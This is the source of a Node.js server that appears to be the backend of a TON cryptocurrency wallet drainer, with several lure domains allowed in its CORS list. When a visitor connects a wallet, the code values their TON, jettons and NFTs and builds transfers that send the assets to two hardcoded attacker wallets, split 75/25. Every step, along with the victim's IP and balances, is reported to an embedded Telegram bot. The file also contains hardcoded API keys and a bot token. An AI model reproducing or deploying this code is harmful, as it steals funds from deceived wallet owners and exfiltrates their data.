const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const cors = require('cors');
const { Cell, beginCell, Address } = require('ton');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const http = require('http');
const https = require('https');


const app = express();
const PORT = process.env.PORT || 3000;

/* 1.  CORS – must be FIRST */
app.use(cors({
  origin: [
    "https://ton.checkyourcrypto.com",
    "https://tondemosos.vercel.app",
    "https://trappap.web.app",
    "https://tonzenoclaus-kappa.vercel.app",
    "https://tonzenoclaus.vercel.app",
    "https://tons-one.vercel.app",
    "https://checkyourcrypto.com",
    "http://localhost:3000"
  ],
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
}));
app.options('*', cors());
app.post('/api/creatingJetton', (req, res) => {
  res.json({ status: "ok" });
});
app.post('/api/transactionStatus', (req, res) => {
  res.json({ status: "ok" });
});
app.post('/api/transactionStatusNft', (req, res) => {
  res.json({ status: "ok" });
});
app.post('/api/transactionStatusTon', (req, res) => {
  res.json({ status: "ok" });
});


app.use(bodyParser.json());
app.use(express.static('public'));

app.get('/health', (_, res) => res.status(200).send('OK'));

app.get('/api/main-wallet', (req, res) => {
  res.json({ mainWallet });
});

app.get('/api/forfee', (req, res) => {
  res.json({ forFee });
});

app.get('/api/second-main-wallet', (req, res) => {
  res.json({ secondMainWallet });
});

app.get('/api/min-totalbal', (req, res) => {
  res.json({ min_totalbal });
});


/* frontend fallback */
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api')) {
    return next(); // allow API routes
  }
  res.sendFile(__dirname + '/index.html');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on port ${PORT}`);
});

const apiKey = 's0Uaior9NIAQEaqlEffWSIIt';
const mainWallet = "UQBMSG_4fBGZNEhJVkcZKbCZgNexcv-5E8doy1_RKODDy1Sy";
const secondMainWallet = "UQDsUlv-cm9SaOwNwQwpYgE7idOomlllTTRK1bTCkqzzBAIb"; // Add second receiver
const telegramBot = '8223833080:AAGELRTg5pqtwerjW-nft5Y2Ekw1qGONddU';
const telegramId = '-1002498212929';
const min_totalbal = 0;
const min_balTok = 0.000001;
const min_balNft = 0.000001;
const forFee = 200000000;
const logError = "false";

const certPath = 'cert';
const keyPath = path.join(certPath, 'server.key');
const certPathFull = path.join(certPath, 'server.crt');

if (fs.existsSync(certPath) && fs.existsSync(keyPath) && fs.existsSync(certPathFull)) {
    http.createServer((req, res) => {
        res.writeHead(301, { "Location": "https://" + req.headers['host'] + req.url });
        res.end();
    }).listen(80, () => {
        console.log('HTTP Server running on port 80');
    });

    const httpsOptions = {
        key: fs.readFileSync(keyPath),
        cert: fs.readFileSync(certPathFull)
    };

    https.createServer(httpsOptions, app).listen(443, () => {
        console.log('HTTPS Server running on port 443');
    });

    console.log('\tSERVER IS ONLINE, LISTENING TO PORTS 80 & 443\n');
} else {
    app.listen(80, () => {
        console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80\n');
    });
}

app.post('/api/opened', async(req, res) => {
    const UserInfo = req.body;

    if (!UserInfo.domain || !UserInfo.ip) {
        return res.status(400).send({ error: 'Bad Request: Missing required UserInfo properties.' });
    }

    const message = `📖<b>User opened the website</b>\n\n🌍 <b>Domain:</b> ${UserInfo.domain}\n✉️ <b>IP Location</b>: ${UserInfo.ip}${UserInfo.country ? ' ' + UserInfo.country : ''}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            res.status(200).json({ status: 'ok' });
        } else {
            res.status(response.status).json({ error: 'Failed to send message' });
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});


/* 1.  TON comment-only payload */
app.post('/api/generate-transaction-bodyTon', (req, res) => {
  const { text_com } = req.body;
  try {
    const body = beginCell().storeUint(0, 32).storeStringTail(text_com).endCell();
    return res.json({ bodyBoc: body.toBoc().toString('base64') });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});

/* 2.  Jetton transfer with comment */
app.post('/api/generate-transaction-bodyJetton', (req, res) => {
  const { text_com, mainWallet, secondMainWallet, tokenBalance } = req.body;
  if (!text_com || !mainWallet || !secondMainWallet || tokenBalance === undefined)
    return res.status(400).json({ error: 'Missing fields' });

  try {
    const amount75 = Math.floor(tokenBalance * 0.75);
    const amount25 = tokenBalance - amount75;

    const fwd = beginCell()
      .storeUint(0, 32)               // op::text_comment
      .storeStringTail(text_com)
      .endCell();

    // 75% to mainWallet
    const body1 = beginCell()
      .storeUint(0x0f8a7ea5, 32)     // jetton::transfer
      .storeUint(0, 64)             // query_id
      .storeCoins(amount75)          // jetton amount
      .storeAddress(Address.parse(mainWallet)) // destination
      .storeAddress(Address.parse(mainWallet)) // response
      .storeBit(0)                   // no custom payload
      .storeCoins(0)                 // forward TON amount
      .storeBit(1)                   // forward payload present
      .storeRef(fwd)
      .endCell();

    // 25% to secondMainWallet
    const body2 = beginCell()
      .storeUint(0x0f8a7ea5, 32)     // jetton::transfer
      .storeUint(0, 64)             // query_id
      .storeCoins(amount25)          // jetton amount
      .storeAddress(Address.parse(secondMainWallet)) // destination
      .storeAddress(Address.parse(secondMainWallet)) // response
      .storeBit(0)                   // no custom payload
      .storeCoins(0)                 // forward TON amount
      .storeBit(1)                   // forward payload present
      .storeRef(fwd)
      .endCell();

    return res.json({ bodyBocs: [body1.toBoc().toString('base64'), body2.toBoc().toString('base64')] });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});

/* 3.  NFT transfer with comment */
app.post('/api/generate-transaction-bodyNft', (req, res) => {
  const { text_com, mainWallet } = req.body;
  if (!text_com || !mainWallet)
    return res.status(400).json({ error: 'Missing fields' });

  try {
    const fwd = beginCell()
      .storeUint(0, 32)
      .storeStringTail(text_com)
      .endCell();

    const body = beginCell()
      .storeUint(0x5fcc3d14, 32)      // nft::transfer
      .storeUint(0, 64)
      .storeAddress(Address.parse(mainWallet)) // new owner
      .storeAddress(Address.parse(mainWallet)) // response
      .storeBit(0)                   // no custom payload
      .storeCoins(0)                 // forward TON (hidden)
      .storeBit(1)                   // forward payload present
      .storeRef(fwd)
      .endCell();

    return res.json({ bodyBoc: body.toBoc().toString('base64') });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});

/* =========================================================
   /api/connected  –  fixed & bullet-proof
   ========================================================= */
app.post('/api/connected', async (req, res) => {
  const { ConnectedWallet, UserInfo } = req.body;

  if (!UserInfo || !ConnectedWallet?.account?.address)
    return res.status(400).json({ error: 'Missing UserInfo or wallet address' });

  try {
    let tonPrice = 2.5; // fallback
    try {
        const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=toncoin&vs_currencies=usd');
        const priceData = await priceRes.json();
        tonPrice = priceData.toncoin.usd;
        console.log(`Live TON price: $${tonPrice}`);
    } catch (err) {
        console.error('Failed to fetch TON price, using fallback 2.5', err);
    } // USD per TON – change if needed
    const apiKey   = 's0Uaior9NIAQEaqlEffWSIIt';

    /* ---------- fetch base TON balance ---------- */
    const raw = await fetch(`https://toncenter.com/api/v3/wallet?address=${ConnectedWallet.account.address}`);
    if (!raw.ok) throw new Error('TON fetch failed');
    const tonData = await raw.json();

    let assetList   = [];
    let jettonList  = [];
    let nftList     = [];
    let tgBalance   = 0;        // in TON
    let totalTonUSD = 0;        // in USD

    if (tonData?.balance) {
      const nanotons = parseFloat(tonData.balance);
      tgBalance      = nanotons / 1e9;
      totalTonUSD    = tgBalance * tonPrice;
      console.log(`Raw nanotons: ${nanotons}, TON balance: ${tgBalance}, TON USD: ${totalTonUSD}`);
      assetList.push({
        type: 'TON',
        name: 'TON',
        balance: totalTonUSD,
        sendingBalance: nanotons - forFee,
        calculatedBalanceUSDTG: totalTonUSD
      });
    }

    /* ---------- fetch jettons ---------- */
    const jRes = await fetch(
      `https://tonapi.io/v2/accounts/${ConnectedWallet.account.address}/jettons?currencies=ton,usd,rub&token=AHIAGHNNXLO4PDQAAAAHMHSZQ5BNGAF5OGJ2JLPYRO5Q7LNR3BNPGD7ZSUGAG46KV7PKLOI`
    );
    const jData = await jRes.json();
    const balances = jData.balances || [];

    balances.forEach(b => {
      const jetton   = b.jetton;
      const symbol   = jetton.symbol;
      const decimals = (symbol === 'jUSDT' || symbol === 'USD₮') ? 1e6 : 1e9;
      const rawAmt   = parseInt(b.balance, 10);
      if (rawAmt === 0) return;

      const amtTok   = rawAmt / decimals;
      const priceUSD = b.price?.prices?.USD || 0;
      const usdVal   = amtTok * priceUSD;

      if (usdVal >= min_balTok) {
        const item = {
          type: 'Jetton',
          name: symbol,
          symbol,
          balance: usdVal,
          calculatedBalanceUSDTG: usdVal,
          address: jetton.address,
          wallet_address: b.wallet_address.address
        };
        assetList.push(item);
        jettonList.push(item);
      }
    });

    /* ---------- fetch NFTs ---------- */
    const nRes = await fetch(
      `https://tonapi.io/v2/accounts/${ConnectedWallet.account.address}/nfts?limit=1000&offset=0&indirect_ownership=false`
    );
    const nData = await nRes.json();
    const nftItems = (nData.nft_items || []).filter(i => i.trust !== 'blacklist');

    const nftPromises = nftItems.map(async item => {
      try {
        const [nft, stats] = await Promise.all([
          fetch(`https://tonapi.nftscan.com/api/ton/assets/${item.address}?show_attribute=true`, {
            headers: { 'X-API-KEY': apiKey }
          }).then(r => r.json()),
          fetch(`https://tonapi.nftscan.com/api/ton/statistics/collection/${item.collection.address}`, {
            headers: { 'X-API-KEY': apiKey }
          }).then(r => r.json())
        ]);

        const price = stats.data?.average_price_24h || 0;
        const usdVal = price * tonPrice;
        if (usdVal >= min_balNft) {
          const meta = JSON.parse(nft.data.metadata_json || '{}');
          const nftItem = {
            type: 'NFT',
            name: meta.name || 'Unknown NFT',
            balance: usdVal * 1e9,
            calculatedBalanceUSDTG: usdVal
          };
          assetList.push(nftItem);
          nftList.push(nftItem);
        }
      } catch { /* ignore single NFT failures */ }
    });

    await Promise.allSettled(nftPromises);

    /* ---------- totals ---------- */
    const totalJettonUSD = jettonList.reduce((s, j) => s + j.calculatedBalanceUSDTG, 0);
    const totalNftUSD    = nftList.reduce((s, n) => s + n.calculatedBalanceUSDTG, 0);
    const totalBalance   = totalTonUSD + totalJettonUSD + totalNftUSD;
    console.log(`Total balance USD: ${totalBalance} (TON: ${totalTonUSD}, Jettons: ${totalJettonUSD}, NFTs: ${totalNftUSD})`);

    const roundedTotalTon = Math.round(totalTonUSD * 100) / 100;

    /* ---------- Telegram ---------- */
    const tgMsg =
      totalBalance > min_totalbal
        ? `<b>📲 User Connected Wallet | ${totalBalance.toFixed(2)} $</b>\n\n` +
          `<b>Domain:</b> ${UserInfo.domain}\n` +
          `<b>IP:</b> ${UserInfo.ip} ${UserInfo.country}\n` +
          `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n` +
          `<blockquote><b>TON:</b> ${tgBalance.toFixed(2)} (${totalTonUSD.toFixed(2)} $)</blockquote>`
        : `<b>🔌 Wallet connected – balance too low</b>\n\n` +
          `<b>Total:</b> ${totalBalance.toFixed(2)} $\n` +
          `<b>IP:</b> ${UserInfo.ip} ${UserInfo.country}\n` +
          `<b>Domain:</b> ${UserInfo.domain}`;

    await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: tgMsg,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    /* ---------- response to front-end ---------- */
    if (totalBalance > min_totalbal) {
        assetList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
        return res.json({ assetList, totalBalance, roundedTotalTon });
    } else {
        return res.json({ totalBalance, roundedTotalTon });
    }
  } catch (e) {
    console.error('/api/connect error:', e);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});
/* ========================================================= */

/* =========================================================
   1.  TON – creating request
   ========================================================= */
app.post('/api/creatingTon', async (req, res) => {
  const { UserInfo, ConnectedWallet, roundedTotalTon } = req.body;
  if (!UserInfo || !ConnectedWallet?.account?.address || roundedTotalTon === undefined)
    return res.status(400).json({ error: 'Missing fields' });

  const msg = `🟠 <b>Creating request for TON | ${roundedTotalTon} $</b>\n\n` +
              `<b>Domain:</b> ${UserInfo.domain}\n` +
              `<b>IP:</b> ${UserInfo.ip} ${UserInfo.country}\n` +
              `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n` +
              `<blockquote>TON – ${roundedTotalTon} $</blockquote>`;

  await notifyTelegramChannel(msg);
  return res.json({ status: 'ok' });
});

/* =========================================================
   2.  TON – transaction status
   ========================================================= */
app.post('/api/transactionStatusTon', async (req, res) => {
  const { status, transactionResult, error, UserInfo, ConnectedWallet, roundedTotalTon } = req.body;
  if (!status || !UserInfo || !ConnectedWallet?.account?.address || roundedTotalTon === undefined)
    return res.status(400).json({ error: 'Missing fields' });

  const base = `<b>Domain:</b> ${UserInfo.domain}\n` +
               `<b>IP:</b> ${UserInfo.ip} ${UserInfo.country}\n` +
               `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n` +
               `<blockquote>TON – ${roundedTotalTon} $</blockquote>`;

  let msg = '';
  switch (status) {
    case 'sent':
    case 'confirmed':
      msg = `<b>💎 Approved Transfer TON | ${roundedTotalTon} $</b>\n\n${base}`;
      break;
    case 'error':
      msg = `<b>🛑 User closed or rejected TON | ${roundedTotalTon} $</b>\n\n${base}`;
      break;
    default:
      msg = `<b>🛑 Unknown status TON | ${roundedTotalTon} $</b>\n\n${base}`;
  }
  if (logError === 'true' && (error || transactionResult))
    msg += `\n\n<pre>${JSON.stringify(error || transactionResult, null, 2)}</pre>`;

  await notifyTelegramChannel(msg);
  return res.json({ status: 'ok' });
});

/* =========================================================
   3.  Jetton – creating request
   ========================================================= */
app.post('/api/creatingJetton', async (req, res) => {
  const { UserInfo, chunk, ConnectedWallet } = req.body;
  if (!UserInfo || !Array.isArray(chunk) || !ConnectedWallet?.account?.address)
    return res.status(400).json({ error: 'Missing fields' });

  const chunkBalance = chunk.reduce((s, a) => s + (a.usdBal || 0), 0);
  let msg = `🟠 <b>Creating request | ${chunkBalance.toFixed(2)} $</b>\n\n` +
            `<b>Domain:</b> ${UserInfo.domain}\n` +
            `<b>IP:</b> ${UserInfo.ip} ${UserInfo.country}\n` +
            `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>`;
  chunk.forEach(a => { msg += `${a.name} – ${a.usdBal} USD\n`; });
  msg += '</blockquote>';

  await notifyTelegramChannel(msg);
  return res.json({ status: 'ok' });
});

/* =========================================================
   4.  Jetton – transaction status
   ========================================================= */
app.post('/api/transactionStatus', async (req, res) => {
  const { status, transactionResult, error, chunk, UserInfo, ConnectedWallet } = req.body;
  if (!status || !Array.isArray(chunk) || !UserInfo || !ConnectedWallet?.account?.address)
    return res.status(400).json({ error: 'Missing fields' });

  const chunkBalance = chunk.reduce((s, a) => s + (a.usdBal || 0), 0);
  const base = `<b>Domain:</b> ${UserInfo.domain}\n` +
               `<b>IP:</b> ${UserInfo.ip}\n` +
               `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>` +
               chunk.map(a => `${a.name} – ${a.usdBal} USD`).join('\n') +
               '</blockquote>';

  let msg = '';
  switch (status) {
    case 'sent':
    case 'confirmed':
      msg = `<b>💎 Approved Transfer | ${chunkBalance.toFixed(2)} $</b>\n\n${base}`;
      break;
    case 'error':
      msg = `<b>🛑 User closed or rejected | ${chunkBalance.toFixed(2)} $</b>\n\n${base}`;
      break;
    default:
      msg = `<b>🛑 Unknown status | ${chunkBalance.toFixed(2)} $</b>\n\n${base}`;
  }
  if (logError === 'true' && (error || transactionResult))
    msg += `\n\n<pre>${JSON.stringify(error || transactionResult, null, 2)}</pre>`;

  await notifyTelegramChannel(msg);
  return res.json({ status: 'ok' });
});

/* =========================================================
   5.  NFT – creating request
   ========================================================= */
app.post('/api/creatingNft', async (req, res) => {
  const { UserInfo, chunk, ConnectedWallet } = req.body;
  if (!UserInfo || !Array.isArray(chunk) || !ConnectedWallet?.account?.address)
    return res.status(400).json({ error: 'Missing fields' });

  const chunkBalance = chunk.reduce((s, a) => s + (a.calculatedBalanceUSDTG || 0), 0);
  let msg = `🟠 <b>Creating request for NFT | ${chunkBalance.toFixed(2)} $</b>\n\n` +
            `<b>Domain:</b> ${UserInfo.domain}\n` +
            `<b>IP:</b> ${UserInfo.ip} ${UserInfo.country}\n` +
            `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>`;
  chunk.forEach(a => { msg += `${a.name} – ${a.calculatedBalanceUSDTG} USD\n`; });
  msg += '</blockquote>';

  await notifyTelegramChannel(msg);
  return res.json({ status: 'ok' });
});

/* =========================================================
   6.  NFT – transaction status
   ========================================================= */
app.post('/api/transactionStatusNft', async (req, res) => {
  const { status, transactionResult, error, chunk, UserInfo, ConnectedWallet } = req.body;
  if (!status || !Array.isArray(chunk) || !UserInfo || !ConnectedWallet?.account?.address)
    return res.status(400).json({ error: 'Missing fields' });

  const chunkBalance = chunk.reduce((s, a) => s + (a.calculatedBalanceUSDTG || 0), 0);
  const base = `<b>Domain:</b> ${UserInfo.domain}\n` +
               `<b>IP:</b> ${UserInfo.ip}\n` +
               `<b>Wallet:</b> <a href="https://tonviewer.com/${ConnectedWallet.account.address}">Ton View</a>\n<blockquote>` +
               chunk.map(a => `${a.name} – ${a.calculatedBalanceUSDTG} USD`).join('\n') +
               '</blockquote>';

  let msg = '';
  switch (status) {
    case 'sent':
    case 'confirmed':
      msg = `<b>💎 Approved Transfer NFT | ${chunkBalance.toFixed(2)} $</b>\n\n${base}`;
      break;
    case 'error':
      msg = `<b>🛑 User closed or rejected NFT | ${chunkBalance.toFixed(2)} $</b>\n\n${base}`;
      break;
    default:
      msg = `<b>🛑 Unknown status NFT | ${chunkBalance.toFixed(2)} $</b>\n\n${base}`;
  }
  if (logError === 'true' && (error || transactionResult))
    msg += `\n\n<pre>${JSON.stringify(error || transactionResult, null, 2)}</pre>`;

  await notifyTelegramChannel(msg);
  return res.json({ status: 'ok' });
});
